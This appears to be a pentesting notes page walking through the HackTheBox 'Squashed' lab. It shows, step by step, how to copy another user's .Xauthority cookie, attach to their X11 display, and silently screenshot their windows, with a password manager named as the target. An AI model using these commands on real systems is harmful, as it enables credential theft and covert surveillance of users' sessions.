---
description: >-
  Pentesting X11X . Window System (X) is a versatile windowing system present on
  UNIX-based operating systems.
---

# Screenshot capturing

### X11

X is a portable, network window system for managing windowed GUI's. When paired with a display manager, it servers as a GUI which can run programs which require a GUI to function properly.

{% hint style="info" %}
The presence of **.Xauthority** and **.xession** files indicate a display could be configured. A .Xauthority file is used to save credentials as cookies used by xauth when authenitcating X sessions. The cookie is used to authenticate the connections to that specific display.
{% endhint %}

This vulnerbality can be found in: [https://app.hackthebox.com/machines/Squashed](https://app.hackthebox.com/machines/Squashed)

### Reading the .Xauthority cookie

```bash
# Read file
$ cat /mnt/.Xauthority | base64
AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABCSegJckVyw7fOCjfGE9Aap

# Decode and save in /tmp
echo AQAADHNxdWFzaGVkLmh0YgABMAASTUlULU1BR0lDLUNPT0tJRS0xABCSegJckVyw7fOCjfGE9Aap | base64 -d > /tmp/.Xauthority
```

### Setting the cookie

```bash
# Set
export XAUTHORITY=/tmp/.Xauthority
```

{% hint style="info" %}
The command `export XAUTHORITY=/tmp/.Xauthority` sets the environment variable `XAUTHORITY` to the value `/tmp/.Xauthority. Environment variables are dynamic values and p`rovide a way to store and retrieve configuration settings, paths to files or directories, or other information that can be used to customize the behavior of applications.
{% endhint %}

Using this cookie we now have access to a User's session. We can use w to find out which display is used by the user.&#x20;

```bash
alex@squashed:/tmp$ w
 16:14:13 up  4:02,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               12:12    4:02m 16.33s  0.03s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

Using the cookie

```bash
# Find more
xdpyinfo -display :0
```

With xwininfo we find active windows.

```bash
xwininfo -root -tree -display :0
```

<figure><img src="../.gitbook/assets/image (80).png" alt=""><figcaption><p>In this case the keepassxc is what we want to see.</p></figcaption></figure>

It shows :0 is the display used. Using the xwd command we dump the image of a window. xwd = X Window dump.

```bash
# Dump image
xwd -root -screen -silent -display :0 > /tmp/screen.xwd
```

* -root           Main root window.
* -screen      Send GetImage request to root window
* -silent        No output messages or sounds
* -display     Display used

### The screenshot

```bash
# Convert the screenshot to png
convert screen.xwd screen.png
```

<figure><img src="../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>
